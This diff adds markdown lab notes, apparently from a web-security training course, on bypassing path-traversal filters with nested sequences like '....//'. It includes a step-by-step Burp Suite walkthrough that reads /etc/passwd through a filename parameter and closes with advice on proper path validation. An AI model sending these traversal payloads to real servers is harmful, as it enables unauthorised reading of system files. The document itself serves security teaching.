@@ -686,3 +686,367 @@ because it fails to validate the filename parameter.
 
 ---
 
+# Topic: Bypassing Filters Using Nested Traversal Sequences
+
+## The Problem
+
+Some applications try to stop path traversal attacks by removing:
+
+```text id="2jlwmc"
+../
+```
+
+from user input.
+
+Example:
+
+Attacker sends:
+
+```text id="xw9gwy"
+../../../etc/passwd
+```
+
+Application removes all:
+
+```text id="ew7j5s"
+../
+```
+
+Result:
+
+```text id="jlwm8i"
+etc/passwd
+```
+
+The attack fails.
+
+# The Bypass Idea
+
+What if the application only removes the exact string:
+
+```text id="6d1hgr"
+../
+```
+
+once?
+
+An attacker may use:
+
+```text id="5zvt6h"
+....//
+```
+
+or
+
+```text id="wtm6k6"
+....\/
+```
+
+These are called **nested traversal sequences**.
+
+
+# How It Works
+
+### Input
+
+```text id="srl4q4"
+....//
+```
+
+Let's break it apart:
+
+```text id="vyg9lt"
+..../
+ /
+```
+
+If the application removes one occurrence of:
+
+```text id="8mlkhm"
+../
+```
+
+the remaining characters can form:
+
+```text id="crzwbf"
+../
+```
+
+again.
+
+
+## Example
+
+Attacker sends:
+
+```text id="ehms0z"
+....//....//....//etc/passwd
+```
+
+Application removes the inner:
+
+```text id="p4etgw"
+../
+```
+
+from each section.
+
+After filtering, it may become:
+
+```text id="g0c3m0"
+../../../etc/passwd
+```
+
+Now the path traversal attack works.
+
+# Visualization
+
+### Original Input
+
+```text id="5f4bp5"
+....//
+```
+
+### Weak Filter Removes
+
+```text id="p72wlh"
+../
+```
+
+### Remaining Characters Become
+
+```text id="4rl4ih"
+../
+```
+
+### Final Result
+
+```text id="tvrp2t"
+Directory Traversal
+```
+
+
+# Another Example
+
+Attacker sends:
+
+```text id="sp3z4x"
+....//....//etc/passwd
+```
+
+Filter removes:
+
+```text id="g44nyu"
+../
+```
+
+Remaining:
+
+```text id="bgmr7u"
+../../etc/passwd
+```
+
+Attack succeeds.
+
+
+# Why Does This Happen?
+
+The developer uses a simple filter like:
+
+```text id="kvulq4"
+remove("../")
+```
+
+instead of properly validating the final path.
+
+The filter changes the input but accidentally creates new traversal sequences.
+
+
+# Key Lesson
+
+Blocking:
+
+```text id="0lzjlwm"
+../
+```
+
+alone is not enough.
+
+Attackers often try alternative encodings and nested patterns to bypass weak filters.
+
+A secure application should:
+
+ Normalize the path
+
+ Resolve the final file location
+
+ Verify it stays inside the allowed directory
+
+instead of simply removing characters.
+
+---
+
+# Path Traversal Using Nested Traversal Sequences
+
+![lab1-](screenshots/labp3.png)
+
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click a product image.
+3. In Burp Suite, go to:
+
+```text
+Proxy > HTTP History
+```
+
+4. Locate the image request.
+
+Example:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+## Step 2: Modify the Filename Parameter
+
+Replace:
+
+```http
+filename=218.png
+```
+
+with:
+
+```http
+filename=....//....//....//etc/passwd
+```
+
+Modified request:
+
+```http
+GET /image?filename=....//....//....//etc/passwd HTTP/2
+```
+
+## Step 3: Send the Request
+
+1. Forward the modified request.
+2. Observe the response.
+
+
+## Step 4: Read the File Contents
+
+The application returns:
+
+```text
+/etc/passwd
+```
+
+Example response:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+![lab1-](screenshots/labbp3.png)
+
+## Step 5: Lab Solved
+
+Successfully reading:
+
+```text
+/etc/passwd
+```
+
+solves the lab.
+
+![lab1-](screenshots/labp3s.png)
+
+
+# Why This Works
+
+Some applications attempt to block:
+
+```text
+../
+```
+
+by removing it from user input.
+
+Example:
+
+```text
+../../../etc/passwd
+```
+
+becomes:
+
+```text
+etc/passwd
+```
+
+and the attack fails.
+
+
+## Bypass Technique
+
+Using:
+
+```text
+....//
+```
+
+When the application removes:
+
+```text
+../
+```
+
+the remaining characters become:
+
+```text
+../
+```
+
+Example:
+
+```text
+....//....//....//etc/passwd
+```
+
+↓
+
+After filtering:
+
+```text
+../../../etc/passwd
+```
+
+↓
+
+Server reads:
+
+```text
+/etc/passwd
+```
+
+
+# Request Example
+
+### Original Request
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+### Modified Request
+
+```http
+GET /image?filename=....//....//....//etc/passwd HTTP/2
+```
+
+---
